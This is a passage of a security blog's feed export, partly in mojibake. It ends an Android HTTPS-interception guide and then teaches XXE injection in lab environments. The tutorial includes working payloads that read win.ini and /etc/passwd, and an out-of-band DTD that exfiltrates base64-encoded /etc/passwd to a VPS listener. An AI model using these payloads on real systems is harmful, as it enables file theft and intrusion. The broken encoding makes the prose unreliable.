cacert.pem</span><br><span class="line">// Linux å°†è¯ä¹¦è½¬æ¢æ ¼å¼,æ³¨æ„åç¼€ä¸º.0</span><br><span class="line">$ mv cacert.pem xxx.0</span><br></pre></td></tr></table></figure></div><p>ä½¿ç”¨adbå°†è¯ä¹¦ç§»å…¥&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;ç›®å½•ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// å°†è¯ä¹¦å¯¼å…¥ /data/local/tmp ç›®å½•</span><br><span class="line">$ adb push 7bf17d07.0 /data/local/tmp</span><br><span class="line">$ adb shell </span><br><span class="line">android:/ $ su</span><br><span class="line">android:/ # mount -o rw,remount / # æŒ‚è½½/systemç›®å½•</span><br><span class="line">android:/ # mv /data/local/tmp/xxx.0 /system/etc/security/cacerts/xxx.0 # ç§»åŠ¨è¯ä¹¦</span><br><span class="line">android:/ # chmod 644 /system/etc/security/cacerts/xxx.0 # ä¿®æ”¹æƒé™</span><br></pre></td></tr></table></figure></div><p>2ï¼‰ä½¿ç”¨ Android 7.0 ä»¥ä¸‹çš„æ‰‹æœºï¼Œæ— éœ€ ROOT ï¼Œå³å¯å°è¯•ä½¿ç”¨æ¨¡æ‹Ÿå™¨è¿›è¡Œæµ‹è¯•</p></li></ul><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>ç»è¿‡æµ‹è¯•ï¼Œæœ‰äº› APP æµé‡ï¼Œä½¿ç”¨é ROOT æ‰‹æœºä¹Ÿèƒ½é€šè¿‡ Burp æŠ“å–åˆ° HTTPS æµé‡ï¼Œåªéœ€è¦å®‰è£… CA è¯ä¹¦å³å¯ã€‚å…·ä½“æ˜¯å¦èƒ½æˆåŠŸå¾—çœ‹ APP è¯ä¹¦éªŒè¯å³æœºåˆ¶æ˜¯å¦ä¸¥æ ¼ã€‚æŠ“åŒ…æ–¹å¼ä¸å±€é™ä¸æ–‡ç« åˆ—ä¸¾çš„æ–¹æ³•ï¼Œé€‰æ‹©é€‚åˆè‡ªå·±çš„æ–¹æ³•æ‰æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚</p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/MKwYYjcHiiHNzT4RzRuBZg</span><br><span class="line">https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://mp.weixin.qq.com/s/2PF9lbIcqPHDBUmiFxX7yw</span><br><span class="line">https://mp.weixin.qq.com/s/f8Lcwz-yjZXCsXiA64gNMg</span><br><span class="line">https://www.52pojie.cn/thread-1593662-1-1.html</span><br><span class="line">https://mp.weixin.qq.com/s/iVsjdjkO5xfqQVHfNEyeUQ</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBæ¼æ´ç³»åˆ—-XXE(å¤–éƒ¨å®ä½“æ³¨å…¥)</title>
      <link href="/2022/11/01/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-XXE/"/>
      <url>/2022/11/01/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-XXE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>XXE(XML External Entity Injection)ï¼Œå³ XML å¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ç”±äº XML è§£æå™¨ç¨‹åºé…ç½®ä¸å½“ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„æ”»å‡»ã€‚æ³¨å…¥çš„æœ¬è´¨æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«å½“åšä»£ç è¿›è¡Œæ‰§è¡Œã€‚</p><h3 id="xmlæ ¼å¼"><a href="#xmlæ ¼å¼" class="headerlink" title="xmlæ ¼å¼"></a>xmlæ ¼å¼</h3><p>XML ä»£è¡¨å¯æ‰©å±•çš„æ ‡è®°è¯­è¨€ï¼Œæ—¨åœ¨å­˜å‚¨å’Œä¼ è¾“æ•°æ®ï¼Œç±»ä¼¼ HTMLï¼Œæœ‰ä¸€ä¸ªæ ‘çŠ¶çš„æ ‡ç­¾å’Œæ•°æ®ç»“æ„ã€‚XML æ–‡æ¡£ç»“æ„åŒ…æ‹¬ XML å£°æ˜ã€DTD æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p>ä¾‹å­å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span> //xmlå£°æ˜</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ //DTDå£°æ˜</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test1</span> <span class="string">&quot;test1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test2</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;&amp;test2;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //æ–‡æ¡£å…ƒç´ </span><br></pre></td></tr></table></figure></div><br/><h4 id="å¤–éƒ¨å®ä½“ä¸å†…éƒ¨å®ä½“"><a href="#å¤–éƒ¨å®ä½“ä¸å†…éƒ¨å®ä½“" class="headerlink" title="å¤–éƒ¨å®ä½“ä¸å†…éƒ¨å®ä½“"></a>å¤–éƒ¨å®ä½“ä¸å†…éƒ¨å®ä½“</h4><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ï¼Œå³å†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ã€‚å†…éƒ¨å®ä½“ä»å†…éƒ¨æ–‡ä»¶å¼•ç”¨ï¼Œå¤–éƒ¨å®ä½“ä»å¤–éƒ¨æ–‡ä»¶å¼•ç”¨ï¼ˆä½¿æ”»å‡»è€…è¿œç¨‹åŠ è½½æ¶æ„å‘½ä»¤æˆ–æ–‡ä»¶ï¼‰ã€‚</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span> //xmlå£°æ˜</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ //DTDå£°æ˜</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test1</span> <span class="string">&quot;test1&quot;</span>&gt;</span> //å†…éƒ¨å®ä½“</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test2</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/1.dtd&quot;</span>&gt;</span> //å¤–éƒ¨å®ä½“</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;&amp;test2;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //æ–‡æ¡£å…ƒç´ </span><br></pre></td></tr></table></figure></div><br/><h4 id="ä¸€èˆ¬å®ä½“ä¸å‚æ•°å®ä½“"><a href="#ä¸€èˆ¬å®ä½“ä¸å‚æ•°å®ä½“" class="headerlink" title="ä¸€èˆ¬å®ä½“ä¸å‚æ•°å®ä½“"></a>ä¸€èˆ¬å®ä½“ä¸å‚æ•°å®ä½“</h4><p>ä¸€èˆ¬å®ä½“ï¼š</p><p>åœ¨ DTD ä¸­å®šä¹‰å®ä½“ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨ï¼Œä¸€èˆ¬å®ä½“çš„å®šä¹‰æ—  % å¼€å¤´ï¼Œå¼•ç”¨ä»¥ &amp; å¼€å¤´ï¼Œä»¥;ç»“å°¾</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span>]&gt;</span> //å¤–éƒ¨å®ä½“</span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span> //<span class="symbol">&amp;xxe;</span>å¼•ç”¨äº†å¤–éƒ¨å®ä½“</span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>pass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><br/><p>å‚æ•°å®ä½“ï¼š</p><p>å‚æ•°å®ä½“å®šä¹‰ä»¥ % ä½œä¸ºå¼€å¤´ï¼Œå¼•ç”¨ä¹Ÿä»¥ % å¼€å¤´</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://eja5f2.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&amp;1111<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="äºŒã€æ¼æ´ç‚¹åŠå±å®³"><a href="#äºŒã€æ¼æ´ç‚¹åŠå±å®³" class="headerlink" title="äºŒã€æ¼æ´ç‚¹åŠå±å®³"></a>äºŒã€æ¼æ´ç‚¹åŠå±å®³</h2><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>æ‰€æœ‰ä½¿ç”¨ XML æ ¼å¼çš„å­˜åœ¨ XXE æ¼æ´çš„å¯èƒ½ï¼Œæ’å…¥æµ‹è¯•è¯­å¥è§‚å¯Ÿå…¶è¿”å›è¯­å¥æ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œå¦‚ä¸‹å›¾</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031165107742.png" data-caption="image-20221031165107742"><img src="/../images/xxe/image-20221031165107742.png" alt="image-20221031165107742"></a></p><h3 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°æ–‡ä»¶è¯»å–</span><br><span class="line">å†…ç½‘è®¿é—®</span><br><span class="line">ä¸»æœºæ‰«æ/ç«¯å£æ‰«æ</span><br><span class="line">è¿œç¨‹ä»£ç æ‰§è¡Œ</span><br><span class="line">æ‹’ç»æœåŠ¡æ”»å‡»</span><br></pre></td></tr></table></figure></div><h2 id="ä¸‰ã€æ¼æ´å­¦ä¹ "><a href="#ä¸‰ã€æ¼æ´å­¦ä¹ " class="headerlink" title="ä¸‰ã€æ¼æ´å­¦ä¹ "></a>ä¸‰ã€æ¼æ´å­¦ä¹ </h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç¯å¢ƒåœ°å€ï¼š<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> è¿™è¾¹é€‰æ‹© Phpstudy ç›´æ¥å¯æœåŠ¡ï¼Œè¿‡äºç®€å•ï¼Œä¸å†èµ˜è¿°ï¼Œè®¿é—®é¡µé¢å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031170222098.png" data-caption="image-20221031170222098"><img src="/../images/xxe/image-20221031170222098.png" alt="image-20221031170222098"></a></p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>åˆ©ç”¨ Burp æŠ“åŒ…ï¼Œåˆ©ç”¨ä¸Šé¢çŸ¥è¯†ç‚¹ï¼Œæ„é€ å®Œæ•´ XML æ ¼å¼ï¼Œå¹¶æ„é€ å¼•ç”¨<code>ä¸€èˆ¬å®ä½“</code>è¿›è¡Œæ¼æ´æµ‹è¯•</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031171102055.png" data-caption="image-20221031171102055"><img src="/../images/xxe/image-20221031171102055.png" alt="image-20221031171102055"></a></p><p>æ„é€ å¼•ç”¨ <code>å‚æ•°å®ä½“</code> æµ‹è¯•</p><p>VPS å¼€å¯æœåŠ¡ï¼Œæµ‹è¯•ç½‘ç»œæ˜¯å¦èƒ½è¿œç¨‹è¿›è¡Œè®¿é—®ï¼Œè‹¥èƒ½è¿›è¡Œè®¿é—®åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œèƒ½è¿›è¡Œè¿œç¨‹åŠ è½½</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031172421381.png" data-caption="image-20221031172421381"><img src="/../images/xxe/image-20221031172421381.png" alt="image-20221031172421381"></a></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:2333&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031194203105.png" data-caption="image-20221031194203105"><img src="/../images/xxe/image-20221031194203105.png" alt="image-20221031194203105"></a></p><p>æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031193511744.png" data-caption="image-20221031193511744"><img src="/../images/xxe/image-20221031193511744.png" alt="image-20221031193511744"></a></p><p>é€šè¿‡ OOB(Out-Of-Band),è¿œç¨‹åŠ è½½ .dtd æ–‡ä»¶å®ç°æ”»å‡»</p><p>1ã€vpsä¸Šæ”¾ç½® dtdæ–‡ä»¶,åä¸º my.dtd , æ–‡ä»¶å†…å®¹ä¸ºå‘½ä»¤æ‰§è¡Œ <code>file:///windows/win.ini</code></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure></div><p>2ã€åˆ©ç”¨ Python3 åœ¨ dtd æ–‡ä»¶ç›®å½•ä¸‹èµ·ä¸´æ—¶ WEB æœåŠ¡</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031200337379.png" data-caption="image-20221031200337379"><img src="/../images/xxe/image-20221031200337379.png" alt="image-20221031200337379"></a></p><p>3ã€Burp æ”¾åŒ…è¿œç¨‹åŠ è½½ .dtd æ–‡ä»¶</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">my</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:2333/my.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %my;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031200130341.png" data-caption="image-20221031200130341"><img src="/../images/xxe/image-20221031200130341.png" alt="image-20221031200130341"></a></p><p>Blind OOB XXEï¼ˆOut-Of-Bandï¼‰å½“å­˜åœ¨ xxe æ¼æ´ï¼Œä½†æ— å›æ˜¾ï¼Œè¿™æ—¶å€™æƒ³è¦è¯»å–æ•æ„Ÿæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ° file åè®®è¿›è¡Œæ•°æ®å¤–å¸¦</p><p>1ã€è¿™è¾¹åˆ©ç”¨ Vulhub ä¸­çš„ç¯å¢ƒè¿›è¡Œå¤ç°ï¼Œè¿›å…¥ vulhub ä¸­çš„ php_xxe è·¯å¾„ä¸‹ï¼Œåœ¨ www ç›®å½•ä¸‹åˆ›å»º xml.php æ¼æ´ç¯å¢ƒï¼Œæºç å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101122158265.png" data-caption="image-20221101122158265"><img src="/../images/xxe/image-20221101122158265.png" alt="image-20221101122158265"></a></p><p>Docker å¯åŠ¨ç¯å¢ƒ <code>docker-compose up -d</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101092838369.png" data-caption="image-20221101092838369"><img src="/../images/xxe/image-20221101092838369.png" alt="image-20221101092838369"></a></p><p>è®¿é—® 8080 ç«¯å£ï¼ŒæˆåŠŸæ­å»ºç¯å¢ƒé¡µé¢å¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101093122193.png" data-caption="image-20221101093122193"><img src="/../images/xxe/image-20221101093122193.png" alt="image-20221101093122193"></a></p><p>è®¿é—® dom.php è§¦å‘ xxe æ¼æ´ï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101100913475.png" data-caption="image-20221101100913475"><img src="/../images/xxe/image-20221101100913475.png" alt="image-20221101100913475"></a></p><p>åŒæ ·åœ°è®¿é—® xml.php è¿›è¡Œ æ–‡ä»¶è¯»å–ï¼Œå‡ºç°æŠ¥é”™æ— æ³•è¯»å–æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101101140907.png" data-caption="image-20221101101140907"><img src="/../images/xxe/image-20221101101140907.png" alt="image-20221101101140907"></a></p><p>3ã€è¿œç¨‹åŠ è½½ .dtd æ–‡ä»¶ï¼Œåˆ©ç”¨æœåŠ¡å™¨å›æ˜¾å†…å®¹ï¼Œ.dtd æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œåä¸º my.dtd (æ³¨ï¼šdtdæ–‡ä»¶ä¸­çš„ç›‘å¬ç«¯å£éœ€ä¸ nc ç›‘å¬ç«¯å£ä¸€è‡´)</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vpsip:ncç›‘å¬çš„ç«¯å£?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>è¿œç¨‹æœåŠ¡å™¨ä¸­ my.dtd ç›®å½•ä¸‹åˆ©ç”¨ Python å¼€å¯ä¸´æ—¶ WEB æœåŠ¡ <code>python3 -m http.server 2333</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101094028596.png" data-caption="image-20221101094028596"><img src="/../images/xxe/image-20221101094028596.png" alt="image-20221101094028596"></a></p><p>åœ¨ç›¸åŒæœåŠ¡å™¨ä¸‹ï¼Œå¼€å¯ç›‘å¬ï¼Œæ¥æ”¶å›æ˜¾æ•°æ® <code>nc -lvp 3333</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101143501078.png" data-caption="image-20221101093949071"><img src="/../images/xxe/image-20221101143501078.png" alt="image-20221101093949071"></a></p><p>4ã€Burp æ”¾åŒ…è¿œç¨‹åŠ è½½ dtd æ–‡ä»¶ï¼Œè¯»å– dtd æ–‡ä»¶å†…å®¹è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vpsip:2333/my.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110422030.png" data-caption="image-20221101110422030"><img src="/../images/xxe/image-20221101110422030.png" 